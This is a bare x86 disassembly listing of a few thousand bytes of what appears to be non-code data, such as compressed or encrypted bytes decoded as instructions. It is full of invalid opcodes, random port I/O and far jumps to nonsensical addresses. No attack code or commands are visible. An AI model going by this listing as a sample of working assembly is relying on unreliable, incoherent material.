  4297ee:	adc    DWORD PTR [edx-0x34a211a3],ecx
  4297f4:	jl     0x4297d7
  4297f6:	inc    ebp
  4297f7:	shr    dh,0x40
  4297fa:	xor    eax,0xffffffd9
  4297fd:	lds    eax,FWORD PTR [eax]
  4297ff:	mov    dh,0xf9
  429801:	xor    bh,BYTE PTR [esp+edi*1]
  429804:	mov    esp,0xf2486f27
  429809:	pop    edx
  42980a:	mov    al,0xe8
  42980c:	(bad)  
  42980d:	int    0x6b
  42980f:	adc    ecx,ebx
  429811:	aam    0xf2
  429813:	call   0x9f2ca8c4
  429818:	dec    eax
  429819:	fcomip st,st(6)
  42981b:	jae    0x4297c7
  42981d:	mov    al,BYTE PTR [ebx-0x5ca8e793]
  429823:	push   ebp
  429824:	not    DWORD PTR [edi-0x58]
  429827:	or     dh,cl
  429829:	fidiv  DWORD PTR [edx+edx*4]
  42982c:	in     eax,0xfb
  42982e:	ins    BYTE PTR es:[edi],dx
  42982f:	adc    DWORD PTR ss:[esi],0x9b4edbfc
  429836:	mov    bh,0xd2
  429838:	xchg   edx,eax
  429839:	inc    ecx
  42983a:	das    
  42983b:	stos   BYTE PTR es:[edi],al
  42983c:	ss popa 
  42983e:	mov    esp,0x282c2a2f
  429843:	xor    ebp,DWORD PTR [esi+0x217fbe4b]
  429849:	jo     0x429842
  42984b:	dec    eax
  42984c:	jnp    0x4298a1
  42984e:	add    DWORD PTR [eax+0x4],esp
  429851:	mov    ch,0x85
  429853:	jle    0x4297f8
  429855:	aaa    
  429856:	push   edx
  429857:	pop    eax
  429858:	dec    esi
  429859:	jmp    0x429843
  42985b:	or     BYTE PTR [edi],dl
  42985d:	mov    bh,al
  42985f:	aad    0xb2
  429861:	push   ecx
  429862:	pop    esp
  429863:	lods   al,BYTE PTR ds:[esi]
  429864:	test   BYTE PTR [edi],cl
  429866:	and    bh,BYTE PTR [esi+0xe]
  429869:	out    dx,al
  42986a:	cmp    al,BYTE PTR [esp+ebx*8+0x678fe341]
  429871:	xor    dh,BYTE PTR [eax+0x207d8b2f]
  429877:	cmp    al,0xe9
  429879:	cli    
  42987a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42987b:	dec    ebp
  42987c:	test   eax,0x988fd9b8
  429881:	stc    
  429882:	mov    bh,0xef
  429884:	jae    0x42981b
  429886:	scas   al,BYTE PTR es:[edi]
  429887:	add    DWORD PTR [ebx+edx*4-0x211277c2],0x3b
  42988f:	hlt    
  429890:	call   DWORD PTR [edx+eax*1-0x12163676]
  429897:	push   edi
  429898:	adc    eax,0xda421f74
  42989d:	aam    0xad
  42989f:	mov    ebp,0xd5cfcf7f
  4298a4:	or     edi,DWORD PTR [edi-0x1b]
  4298a7:	ds retf 0x4aae
  4298ab:	adc    eax,0x4c7670e1
  4298b0:	dec    ebx
  4298b1:	xchg   esi,eax
  4298b2:	or     dl,dh
  4298b4:	xor    esi,DWORD PTR [ebx-0x24]
  4298b7:	(bad)  
  4298b8:	xor    al,0xd7
  4298ba:	fwait
  4298bb:	add    ecx,DWORD PTR [eax+0x132b985d]
  4298c1:	sub    BYTE PTR [edi+0x17dfea67],bh
  4298c7:	cld    
  4298c8:	enter  0x8ddc,0x84
  4298cc:	jmp    FWORD PTR [edi-0x52]
  4298cf:	push   edi
  4298d0:	xchg   esi,eax
  4298d1:	sub    BYTE PTR [ebp-0x1a],bl
  4298d4:	and    al,0x3a
  4298d6:	cmp    edx,DWORD PTR [ebx+0x5ece6a49]
  4298dc:	cmp    bl,al
  4298de:	inc    ebx
  4298df:	mov    ebx,0xf89ee751
  4298e4:	or     bh,BYTE PTR [edi-0x6bfbf276]
  4298ea:	out    dx,eax
  4298eb:	hlt    
  4298ec:	add    BYTE PTR [eax],cl
  4298ee:	mov    eax,DWORD PTR [eax]
  4298f0:	ror    DWORD PTR [eax+0x113bd59d],cl
  4298f6:	fbstp  TBYTE PTR [ebx-0x3787c2ac]
  4298fc:	(bad)  
  4298fd:	adc    ebp,DWORD PTR [eax+0x748acf34]
  429903:	sbb    al,0x52
  429905:	push   ebp
  429906:	les    eax,FWORD PTR [ebx]
  429908:	jmp    0xf96c:0x55055c6b
  42990f:	fimul  DWORD PTR [edx-0x44]
  429912:	cmp    ecx,DWORD PTR [ebx-0x4ea4877a]
  429918:	ss pop ebx
  42991a:	adc    eax,DWORD PTR [ecx+0x73]
  42991d:	cmp    al,dl
  42991f:	mov    al,BYTE PTR [esi]
  429921:	into   
  429922:	jp     0x4298f1
  429924:	(bad)  
  429925:	popa   
  429926:	or     al,0xe8
  429928:	paddw  mm5,QWORD PTR [eax+esi*4]
  42992c:	je     0x4298db
  42992e:	ins    BYTE PTR es:[edi],dx
  42992f:	call   0xf531:0x6b446b39
  429936:	repz cmc 
  429938:	scas   al,BYTE PTR es:[edi]
  429939:	sbb    DWORD PTR [edx+ebx*2],edx
  42993c:	xchg   ebx,eax
  42993d:	(bad)  
  42993f:	(bad)  
  429940:	cmp    bl,BYTE PTR [ebp+0x26b0c09f]
  429946:	aad    0x81
  429948:	je     0x429913
  42994a:	fidiv  DWORD PTR [edx+0x25efade4]
  429950:	loop   0x4299b7
  429952:	fisubr WORD PTR [ebx+0x72]
  429955:	mov    esi,0x85fb9871
  42995a:	in     eax,0xa0
  42995c:	jns    0x429988
  42995e:	or     eax,0xc9e14509
  429963:	pop    ds
  429964:	xchg   ecx,eax
  429965:	adc    BYTE PTR [ebx+0x1e1befff],ch
  42996b:	in     al,dx
  42996c:	pop    ebx
  42996d:	es cmc 
  42996f:	adc    BYTE PTR [ecx-0x3e],ah
  429972:	jnp    0x429904
  429974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429975:	or     dh,BYTE PTR [eax]
  429977:	mov    ecx,0x72f0b73e
  42997c:	es jl  0x429914
  42997f:	out    0x29,eax
  429981:	fnstcw WORD PTR [edi+0x25d77903]
  429987:	out    0x96,eax
  429989:	push   0x3b263919
  42998e:	cli    
  42998f:	mov    bl,0x20
  429991:	sub    DWORD PTR [eax],ebp
  429993:	sub    al,0x9c
  429995:	jge    0x42996d
  429997:	ins    BYTE PTR es:[edi],dx
  429998:	pusha  
  429999:	xor    cl,BYTE PTR ds:[edi]
  42999c:	pop    esi
  42999d:	das    
  42999e:	or     eax,0x2d674738
  4299a3:	imul   ebx,ebp,0x6092c4b1
  4299a9:	in     eax,dx
  4299aa:	sub    DWORD PTR [esi+0x3feabd6c],edi
  4299b0:	sub    al,0x98
  4299b2:	mov    ebp,0x896cf7c0
  4299b7:	add    edx,DWORD PTR [ecx+ebp*1+0x2a]
  4299bb:	dec    esp
  4299bc:	rol    DWORD PTR [eax+eiz*8+0x2dd56c78],1
  4299c3:	mov    ebp,0x4375d8
  4299c8:	stos   DWORD PTR es:[edi],eax
  4299c9:	les    edi,FWORD PTR [esi+0x1f5c9c7f]
  4299cf:	and    al,bl
  4299d1:	in     al,0x72
  4299d3:	mov    ch,0xed
  4299d5:	jmp    FWORD PTR [esi-0x6ed00286]
  4299db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4299dc:	mov    bl,0x25
  4299de:	out    dx,eax
  4299df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4299e0:	cmp    eax,0x11943859
  4299e5:	or     DWORD PTR [ecx-0x6e],ebx
  4299e8:	add    eax,0x1f83c4e0
  4299ed:	mov    ds:0xfa0a0bce,eax
  4299f2:	xchg   esp,eax
  4299f3:	add    ah,dl
  4299f5:	lds    eax,FWORD PTR [esi+0x3e1d8eb2]
  4299fb:	add    eax,DWORD PTR ds:0x5b098eea
  429a01:	inc    ecx
  429a02:	dec    ebp
  429a03:	sbb    eax,0xc886f3e5
  429a08:	jo     0x42999f
  429a0a:	jb     0x4299a0
  429a0c:	adc    eax,0x46cc4b8f
  429a11:	mov    DWORD PTR [eax-0x30],edx
  429a14:	cmp    BYTE PTR [edx+0x24834e8e],ch
  429a1a:	cdq    
  429a1b:	ins    BYTE PTR es:[edi],dx
  429a1c:	sbb    ebp,DWORD PTR [edi-0x6d300811]
  429a22:	not    DWORD PTR [eax]
  429a24:	addr16 icebp 
  429a26:	es jne 0x429a46
  429a29:	ins    DWORD PTR es:[edi],dx
  429a2a:	(bad)  
  429a2b:	dec    esp
  429a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a2d:	gs repz scas eax,DWORD PTR es:[edi]
  429a30:	cmp    ebx,DWORD PTR [esi-0x5f210b90]
  429a36:	mov    edi,0x5f60a2ad
  429a3b:	int    0x9e
  429a3d:	pop    DWORD PTR [ecx]
  429a3f:	arpl   WORD PTR [esi+0x20a5ba00],ax
  429a45:	cld    
  429a46:	aam    0xa0
  429a48:	ds stos BYTE PTR es:[edi],al
  429a4a:	push   edi
  429a4b:	push   0xffffffff
  429a4d:	mov    al,ds:0xaded8c5e
  429a52:	xchg   BYTE PTR [edi],al
  429a54:	mov    ?,WORD PTR [edx]
  429a56:	push   ecx
  429a57:	adc    cl,al
  429a59:	arpl   WORD PTR ds:0xbc1a1f46,sp
  429a5f:	inc    esp
  429a60:	std    
  429a61:	sbb    esp,DWORD PTR [edi-0x6f]
  429a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a65:	and    DWORD PTR [edx-0x64],ebx
  429a68:	(bad)  
  429a69:	in     eax,0x51
  429a6b:	enter  0x1188,0x56
  429a6f:	pop    ebx
  429a70:	jmp    0x3a96023a
  429a75:	iret   
  429a76:	sbb    eax,DWORD PTR ds:0xfb906248
  429a7c:	out    dx,al
  429a7d:	js     0x429a40
  429a7f:	imul   edi,DWORD PTR [esi],0x75c092
  429a85:	(bad)  
  429a86:	xchg   DWORD PTR [edx+0x916d1ca],ebp
  429a8c:	mov    BYTE PTR [ecx+0x6d7b89b0],dl
  429a92:	cli    
  429a93:	xchg   edi,eax
  429a94:	and    BYTE PTR [eax],ch
  429a96:	mov    eax,0xf51b17d9
  429a9b:	adc    dl,BYTE PTR [ecx+0x24]
  429a9e:	(bad)  
  429a9f:	clc    
  429aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429aa1:	nop
  429aa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429aa3:	loope  0x429a7d
  429aa5:	mov    ebx,0xfaabf4ce
  429aaa:	xchg   ebx,eax
  429aab:	xor    al,0x40
  429aad:	js     0x429a33
  429aaf:	mov    bh,0xb2
  429ab1:	loopne 0x429a3e
  429ab3:	out    0x91,eax
  429ab5:	scas   al,BYTE PTR es:[edi]
  429ab6:	jb     0x429af0
  429ab8:	lock mov DWORD PTR [eax],0xc2eb00be
  429abf:	or     bl,dl
  429ac1:	ss aam 0xe2
  429ac4:	(bad)  [edx-0x4c0a78a7]
  429aca:	test   DWORD PTR [edi],edx
  429acc:	les    eax,FWORD PTR [eax-0x4b]
  429acf:	pushf  
  429ad0:	das    
  429ad1:	mov    esi,0x1e4d783d
  429ad6:	jmp    0x429b4e
  429ad8:	lahf   
  429ad9:	scas   eax,DWORD PTR es:[edi]
  429ada:	pop    es
  429adb:	adc    DWORD PTR [ecx+0x313d33b9],edi
  429ae1:	pop    edi
  429ae2:	test   eax,0x4195de8c
  429ae7:	inc    edi
  429ae8:	mov    ecx,0xb7f8ea36
  429aed:	inc    eax
  429aee:	xor    DWORD PTR [ebx+0x5624c002],ecx
  429af4:	inc    BYTE PTR [ebp+0xf]
  429af7:	cmc    
  429af8:	xor    eax,0x399e2b4
  429afd:	jecxz  0x429b77
  429aff:	jae    0x429aba
  429b01:	sub    bh,BYTE PTR [eax+0xc208ec7]
  429b07:	mov    dl,bl
  429b09:	fs sbb ch,ch
  429b0c:	mov    eax,ds:0xaf9685d7
  429b11:	mov    ds:0x4b469c0b,eax
  429b16:	dec    esp
  429b17:	(bad)  
  429b18:	outs   dx,BYTE PTR ds:[esi]
  429b19:	(bad)  
  429b1a:	nop
  429b1b:	mov    eax,ds:0x13d1f472
  429b20:	adc    al,0xa5
  429b22:	xchg   edx,eax
  429b23:	leave  
  429b24:	popf   
  429b25:	push   eax
  429b26:	xor    DWORD PTR [edx-0x134997a8],ecx
  429b2c:	xchg   DWORD PTR [esi],ebp
  429b2e:	leave  
  429b2f:	rcr    dl,cl
  429b31:	sbb    ah,dh
  429b33:	sub    BYTE PTR [edi],ah
  429b35:	cmc    
  429b36:	bound  edi,QWORD PTR [esi-0x19]
  429b39:	shl    DWORD PTR [eax-0x26],1
  429b3c:	cmp    al,0x80
  429b3e:	into   
  429b3f:	cmc    
  429b40:	push   eax
  429b41:	shr    DWORD PTR [esi],cl
  429b43:	mov    ax,ds:0xa02ec40f
  429b49:	fild   WORD PTR [esi-0x431b447b]
  429b4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429b50:	in     al,0x66
  429b52:	pop    ebp
  429b53:	fdiv   st(6),st
  429b55:	jno    0x429b12
  429b57:	push   edi
  429b58:	jmp    0x79bfcde9
  429b5d:	enter  0x260e,0xa2
  429b61:	jbe    0x429b81
  429b63:	or     eax,0xed0400ed
  429b68:	scas   eax,DWORD PTR es:[edi]
  429b69:	push   esi
  429b6a:	xchg   esp,eax
  429b6b:	and    esp,DWORD PTR [eax-0x15]
  429b6e:	xor    eax,0xca25f02
  429b73:	iret   
  429b74:	push   edi
  429b75:	jg     0x429b1e
  429b77:	mov    ebp,0xcc3e0fca
  429b7c:	or     DWORD PTR [ebx],ebp
  429b7e:	stos   DWORD PTR es:[edi],eax
  429b7f:	mov    ds:0x189cbf8,al
  429b84:	add    al,0x3
  429b86:	hlt    
  429b87:	jg     0x429be5
  429b89:	pop    ds
  429b8a:	push   ds
  429b8b:	and    eax,0x2660b895
  429b90:	ret    
  429b91:	or     al,0xdc
  429b93:	aad    0x97
  429b95:	dec    edi
  429b96:	(bad)  
  429b97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429b98:	fist   WORD PTR [ecx]
  429b9a:	lods   eax,DWORD PTR ds:[esi]
  429b9b:	lods   al,BYTE PTR ds:[esi]
  429b9c:	push   0xffffffb1
  429b9e:	cs jo  0x429ba5
  429ba1:	stos   DWORD PTR es:[edi],eax
  429ba2:	fs retf 0xe333
  429ba6:	jae    0x429bac
  429ba8:	jnp    0x429b5c
  429baa:	xor    BYTE PTR [esi-0x7a],0x22
  429bae:	inc    DWORD PTR gs:[esi+0x40366f09]
  429bb5:	ss mov al,0x9f
  429bb8:	mov    edi,0xf3bb6a56
  429bbd:	into   
  429bbe:	mov    ah,BYTE PTR [eax+edi*8]
  429bc1:	dec    ebx
  429bc2:	sub    esp,esi
  429bc4:	xor    BYTE PTR [edi+0x23],dl
  429bc7:	inc    ebx
  429bc8:	push   cs
  429bc9:	pusha  
  429bca:	dec    edx
  429bcb:	fistp  WORD PTR [ecx+0x413a83ec]
  429bd1:	ins    DWORD PTR es:[edi],dx
  429bd2:	xor    bh,BYTE PTR [ecx+0x2ee455ef]
  429bd8:	js     0x429c3f
  429bda:	xor    eax,0x2b1665aa
  429bdf:	scas   eax,DWORD PTR es:[edi]
  429be0:	js     0x429b88
  429be2:	cmp    dh,BYTE PTR [edx+eax*8-0x6d]
  429be6:	push   ss
  429be7:	or     eax,0x411e33a2
  429bec:	idiv   BYTE PTR [ebx]
  429bee:	push   ebp
  429bef:	ins    BYTE PTR es:[edi],dx
  429bf0:	enter  0x8bff,0xc5
  429bf4:	mov    edi,0x38ed24fb
  429bf9:	push   esp
  429bfa:	in     eax,dx
  429bfb:	mov    al,0x4a
  429bfd:	test   eax,0x21288642
  429c02:	jno    0x429c7a
  429c04:	jb     0x429bad
  429c06:	mov    esi,0xce9ae07b
  429c0b:	test   al,0xb6
  429c0d:	gs jo  0x429c4c
  429c10:	pop    eax
  429c11:	out    dx,al
  429c12:	or     edi,edx
  429c14:	sbb    cl,ch
  429c16:	test   BYTE PTR [eax+0x7b],al
  429c19:	push   0x45f198ed
  429c1e:	mov    ebp,0x5beaf3ff
  429c23:	ds dec esp
  429c25:	xchg   ebp,eax
  429c26:	mov    al,ch
  429c28:	dec    esi
  429c29:	inc    ecx
  429c2a:	data16 std 
  429c2c:	fld    DWORD PTR [esi-0x609289a4]
  429c32:	popa   
  429c33:	or     bh,bl
  429c35:	mov    ah,0x71
  429c37:	pop    edx
  429c38:	push   edx
  429c39:	pop    esi
  429c3a:	icebp  
  429c3b:	imul   esp,DWORD PTR [ecx-0x49a0ce13],0x41
  429c42:	push   0x91b515ad
  429c47:	mov    ch,0xec
  429c49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429c4a:	bound  ebx,QWORD PTR [ebx+0x7f1acce8]
  429c50:	xchg   edi,eax
  429c51:	adc    DWORD PTR [eax-0x21],edx
  429c54:	sub    al,BYTE PTR [eax+0x75a8d43d]
  429c5a:	cld    
  429c5b:	xor    ch,dl
  429c5d:	loope  0x429c63
  429c5f:	jecxz  0x429cb3
  429c61:	mov    ebp,0x131e822a
  429c66:	push   0x6a5bce83
  429c6b:	fisttp DWORD PTR [ebp+0x5b5742]
  429c71:	or     eax,0xb4033691
  429c76:	(bad)  
  429c77:	xchg   ecx,eax
  429c78:	retf   0x9cf7
  429c7b:	jmp    0x429ce7
  429c7d:	and    al,0x69
  429c7f:	jmp    0x429ce5
  429c81:	xchg   edx,eax
  429c82:	add    edi,eax
  429c84:	cmp    al,0x73
  429c86:	out    dx,al
  429c87:	popf   
  429c88:	or     DWORD PTR [edx],0xc7e73436
  429c8e:	inc    ecx
  429c8f:	add    BYTE PTR [eax],dh
  429c91:	xchg   ebx,eax
  429c92:	and    BYTE PTR [esi],ah
  429c94:	(bad)  
  429c96:	xor    eax,DWORD PTR [ebx]
  429c98:	and    dh,BYTE PTR [edx+0x64]
  429c9b:	std    
  429c9c:	setp   BYTE PTR [ecx-0x344d81f9]
  429ca3:	inc    ebp
  429ca4:	jmp    0x429cda
  429ca6:	fs or  esi,eax
  429ca9:	in     eax,dx
  429caa:	and    esi,DWORD PTR [edx+0x7f]
  429cad:	mov    dh,bh
  429caf:	push   ds
  429cb0:	sbb    dl,ah
  429cb2:	jno    0x429cfa
  429cb4:	(bad)  
  429cb6:	ret    0x196
  429cb9:	mov    ds:0xa3b5e6,al
  429cbe:	rcl    DWORD PTR [esi+0x784b346],1
  429cc4:	xor    BYTE PTR [ebp+0x24],ch
  429cc7:	jnp    0x429c5d
  429cc9:	out    0x69,eax
  429ccb:	jo     0x429d10
  429ccd:	mov    edx,gs
  429ccf:	sub    BYTE PTR [ecx],0x3c
  429cd2:	and    esp,DWORD PTR [ecx+0x14]
  429cd5:	or     esi,DWORD PTR [ebp-0x12b2ec6f]
  429cdb:	je     0x429cee
  429cdd:	(bad)  
  429cde:	cld    
  429cdf:	push   edi
  429ce0:	xchg   DWORD PTR [edx+0x551aaae9],edx
  429ce6:	test   BYTE PTR [edi+ebp*4+0x40],al
  429cea:	cmp    DWORD PTR [ecx*1-0x7f5b966],esp
  429cf1:	popf   
  429cf2:	xlat   BYTE PTR ds:[ebx]
  429cf3:	hlt    
  429cf4:	add    DWORD PTR ds:0x77af9c31,ebp
  429cfa:	in     eax,0x82
  429cfc:	test   BYTE PTR [edi+0x35],dh
  429cff:	cmp    al,0x69
  429d01:	cld    
  429d02:	cld    
  429d03:	sub    bh,BYTE PTR [edx+ecx*8+0x2a]
  429d07:	mov    esp,DWORD PTR [ecx+edx*8+0x7b4ebd2f]
  429d0e:	inc    BYTE PTR [eax-0x78]
  429d11:	pop    edx
  429d12:	and    esp,esi
  429d14:	inc    ebp
  429d15:	push   edx
  429d16:	cmp    ebp,edx
  429d18:	jbe    0x429cdf
  429d1a:	int3   
  429d1b:	lds    ecx,FWORD PTR [eax+0x7951bb67]
  429d21:	and    eax,0x15f9b722
  429d26:	repnz push cs
  429d28:	(bad)  
  429d29:	jge    0x429d65
  429d2b:	pop    eax
  429d2c:	sbb    DWORD PTR [ebp+0x4502056e],ebp
  429d32:	scas   al,BYTE PTR es:[edi]
  429d33:	sar    DWORD PTR [ecx+0x76d27f5b],0x5e
  429d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d3b:	xlat   BYTE PTR ds:[ebx]
  429d3c:	shr    DWORD PTR [edi+0x12],cl
  429d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d40:	test   ebp,0xa92750b0
  429d46:	ins    BYTE PTR es:[edi],dx
  429d47:	and    ch,ah
  429d49:	push   es
  429d4a:	dec    ebp
  429d4b:	imul   ecx,ebx,0xd8da8132
  429d51:	retf   
  429d52:	in     eax,dx
  429d53:	add    DWORD PTR [edx+ebx*2+0x62e89457],edx
  429d5a:	aas    
  429d5b:	xor    DWORD PTR [esi-0x51259ca3],edx
  429d61:	mov    edi,0xad0078ee
  429d66:	cwde   
  429d67:	push   ebp
  429d68:	mov    ds:0x4c0f0eff,al
  429d6d:	or     bl,dl
  429d6f:	and    eax,0xea406754
  429d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d75:	aas    
  429d76:	ins    BYTE PTR es:[edi],dx
  429d77:	and    ebp,edi
  429d79:	mov    ebp,0x2aef9fb7
  429d7e:	sub    ah,ah
  429d80:	adc    bl,BYTE PTR [eax]
  429d82:	pop    ebx
  429d83:	int3   
  429d84:	inc    esi
  429d85:	xchg   edi,eax
  429d86:	dec    ebp
  429d87:	xor    ch,ah
  429d89:	dec    edx
  429d8a:	mov    eax,ds:0x193db747
  429d8f:	ins    BYTE PTR es:[edi],dx
  429d90:	aaa    
  429d91:	aaa    
  429d92:	add    eax,0xd205c025
  429d97:	push   ebx
  429d98:	mov    cl,0x48
  429d9a:	mov    esp,0xe7a6a125
  429d9f:	mov    DWORD PTR ds:0x44a0dd94,eax
  429da5:	shld   DWORD PTR [esi-0x4eb44b48],ebp,cl
  429dac:	cmp    al,BYTE PTR [ebx+0x6d]
  429daf:	and    eax,DWORD PTR [edi+0x6a4e9143]
  429db5:	dec    edi
  429db6:	inc    edx
  429db7:	or     DWORD PTR [edx+0x4fd2cb7e],eax
  429dbd:	lds    ebx,FWORD PTR [ebx+ebx*4]
  429dc0:	push   ebx
  429dc1:	add    dl,dl
  429dc3:	xor    ecx,DWORD PTR [edx]
  429dc5:	xchg   ebp,eax
  429dc6:	cmc    
  429dc7:	dec    ecx
  429dc8:	ret    0xf999
  429dcb:	mov    ah,0xfa
  429dcd:	jmp    0xf29:0xb270a24e
  429dd4:	sbb    dh,BYTE PTR [eax-0x644c6888]
  429dda:	adc    DWORD PTR [edx+ecx*8],ebp
  429ddd:	jge    0x429dac
  429ddf:	stc    
  429de0:	xchg   esi,eax
  429de1:	pop    eax
  429de2:	or     eax,0xa4c8cb0c
  429de7:	jle    0x429e1c
  429de9:	ins    DWORD PTR es:[edi],dx
  429dea:	div    BYTE PTR [ebx-0x1e6d97fa]
  429df0:	inc    ecx
  429df1:	xchg   ebp,eax
  429df2:	stos   DWORD PTR es:[edi],eax
  429df3:	sbb    eax,0x7f671ffd
  429df8:	dec    edx
  429df9:	sub    al,0xe6
  429dfb:	pop    edx
  429dfc:	jle    0x429e02
  429dfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429dff:	or     BYTE PTR [ecx],0xdd
  429e02:	push   ecx
  429e03:	call   0xe3fd2cb9
  429e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e09:	in     eax,0xbc
  429e0b:	mov    dl,0x9b
  429e0d:	jbe    0x429da5
  429e0f:	sbb    DWORD PTR [ecx-0x8],ebx
  429e12:	push   ebx
  429e13:	in     eax,0x8b
  429e15:	or     eax,0xf0d141b7
  429e1a:	enter  0xf739,0x9f
  429e1e:	in     al,0x96
  429e20:	sbb    eax,eax
  429e22:	xchg   ecx,eax
  429e23:	adc    al,0xa7
  429e25:	jno    0x429e49
  429e27:	sub    eax,0xa089157b
  429e2c:	test   BYTE PTR [edi-0x61],dl
  429e2f:	or     ebx,DWORD PTR [edx-0x693cb4c4]
  429e35:	leave  
  429e36:	retf   
  429e37:	frstor [ebx-0x5]
  429e3b:	loop   0x429ea8
  429e3d:	inc    ebx
  429e3e:	or     al,0x28
  429e40:	scas   al,BYTE PTR es:[edi]
  429e41:	and    DWORD PTR [edx],edi
  429e43:	cmp    ax,0xde62
  429e47:	cli    
  429e48:	arpl   WORD PTR [edi+ecx*1],si
  429e4b:	mov    cl,0x6d
  429e4d:	lods   al,BYTE PTR ds:[esi]
  429e4e:	sar    BYTE PTR ds:0x37dc762f,cl
  429e54:	xchg   DWORD PTR [ebx+0x6c3cca1f],edx
  429e5a:	pop    edi
  429e5b:	jbe    0x429e41
  429e5d:	gs push esi
  429e5f:	out    dx,eax
  429e60:	fild   QWORD PTR [edi-0x65ced254]
  429e66:	int    0xcd
  429e68:	mov    eax,ds:0x6ea21e0f
  429e6d:	push   esi
  429e6e:	and    cl,BYTE PTR [ecx]
  429e70:	fnstenv [edx+0x27]
  429e73:	(bad)  
  429e74:	fsubp  st(1),st
  429e76:	sbb    BYTE PTR fs:[edi+ebx*2-0x3f],dl
  429e7b:	adc    DWORD PTR [eax+0x60],esi
  429e7e:	adc    BYTE PTR [ecx+ebx*4-0x1105cb9b],dl
  429e85:	dec    ebp
  429e86:	data16 fadd QWORD PTR gs:[ebx]
  429e8a:	pop    es
  429e8b:	mov    ds:0x781157f6,al
  429e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e91:	mov    edi,DWORD PTR [ebx+0x14ddd591]
  429e97:	mov    bl,0xec
  429e99:	push   esi
  429e9a:	(bad)  
  429e9b:	js     0x429e4d
  429e9d:	aaa    
  429e9e:	jns    0x429e70
  429ea0:	in     eax,dx
  429ea1:	addr16 jo 0x429e54
  429ea4:	adc    BYTE PTR [ecx],bl
  429ea6:	cmp    edx,DWORD PTR [ebx+edx*1+0x40a15692]
  429ead:	retf   
  429eae:	fdivp  st(1),st
  429eb0:	mov    edx,0xe8765f8f
  429eb5:	imul   ecx,DWORD PTR [ebp+0x2c7b6fcd],0xffffffd2
  429ebc:	add    al,0x30
  429ebe:	and    ch,BYTE PTR [esi+0x2c]
  429ec1:	cmp    ebx,eax
  429ec3:	mov    ah,0x83
  429ec5:	(bad)
  429ec8:	loopne 0x429e94
  429eca:	push   0xf
  429ecc:	inc    BYTE PTR [edx]
  429ece:	pop    eax
  429ecf:	mov    al,ds:0x23d9cd94
  429ed4:	inc    ecx
  429ed5:	add    eax,DWORD PTR [edi-0x691db4ee]
  429edb:	xchg   edi,eax
  429edc:	pop    edx
  429edd:	sbb    al,0xe9
  429edf:	ss (bad) 
  429ee1:	xchg   edi,eax
  429ee2:	lahf   
  429ee3:	mov    al,ds:0xa89ecd1
  429ee8:	push   edi
  429ee9:	sbb    eax,0x38f18453
  429eee:	and    BYTE PTR [esi],ah
  429ef0:	cmp    DWORD PTR [edi-0x51],esi
  429ef3:	sbb    BYTE PTR [ecx],dl
  429ef5:	xchg   edx,eax
  429ef6:	out    dx,eax
  429ef7:	xchg   ebx,eax
  429ef8:	out    0x44,al
  429efa:	repz int 0xba
  429efd:	pushf  
  429efe:	mov    ebx,0xc07093cc
  429f03:	mov    ecx,0x441d934f
  429f08:	mov    eax,0x734753e7
  429f0d:	repz pop ds
  429f0f:	xor    edi,edi
  429f11:	or     esi,DWORD PTR [eax-0x244801ce]
  429f17:	mov    ds:0x2a2bdb1e,eax
  429f1c:	addr16 clc 
  429f1e:	rcl    dh,0xd7
  429f21:	cmp    al,0xab
  429f23:	jbe    0x429f2c
  429f25:	int    0x6b
  429f27:	jmp    0xab27bfc7
  429f2c:	push   es
  429f2d:	mov    BYTE PTR [ebp+0x12],ah
  429f30:	jmp    0xaac5:0x98436bf0
  429f37:	leave  
  429f38:	jecxz  0x429ee1
  429f3a:	jg     0x429f2e
  429f3c:	dec    ebx
  429f3d:	xchg   edx,eax
  429f3e:	cmp    BYTE PTR [edi],ch
  429f40:	sub    BYTE PTR [edi+0x291ae6cf],bl
  429f46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f47:	addr16 mov dl,0xcd
  429f4a:	jo     0x429f92
  429f4c:	mov    ah,0x22
  429f4e:	and    DWORD PTR [eax],0x8a2d8112
  429f54:	fild   DWORD PTR [esi+0x2abf6499]
  429f5a:	xchg   BYTE PTR [eax+0x3f],ch
  429f5d:	std    
  429f5e:	push   es
  429f5f:	or     DWORD PTR [edi+0x38],ebp
  429f62:	inc    esi
  429f63:	outs   dx,DWORD PTR ds:[esi]
  429f64:	xchg   ebp,eax
  429f65:	xor    DWORD PTR [ebp-0x2b],edi
  429f68:	dec    ebx
  429f69:	loopne 0x429f02
  429f6b:	dec    ecx
  429f6c:	lods   eax,DWORD PTR ds:[esi]
  429f6d:	mov    WORD PTR [ecx],?
  429f6f:	inc    ebp
  429f70:	in     al,dx
  429f71:	pop    esp
  429f72:	mov    dl,0xfc
  429f74:	add    DWORD PTR [edi-0x61360578],esi
  429f7a:	xchg   edx,ebp
  429f7c:	adc    al,0x9e
  429f7e:	mov    WORD PTR [esi],ds
  429f80:	dec    eax
  429f81:	lods   eax,DWORD PTR ds:[esi]
  429f82:	enter  0x34d1,0xa7
  429f86:	mov    dl,0xfb
  429f88:	sbb    ebp,DWORD PTR [eax+0x7]
  429f8b:	push   edi
  429f8c:	or     BYTE PTR ds:0x3889cd9a,0x3b
  429f93:	jge    0x429f55
  429f95:	sbb    ch,BYTE PTR [ebp+0x5a]
  429f98:	ret    0x77a6
  429f9b:	push   cs
  429f9c:	adc    BYTE PTR [edx-0x4f6ae874],ch
  429fa2:	dec    eax
  429fa3:	sar    BYTE PTR [ebx-0x6c9f2cb0],0x60
  429faa:	retf   
  429fab:	jge    0x429f3f
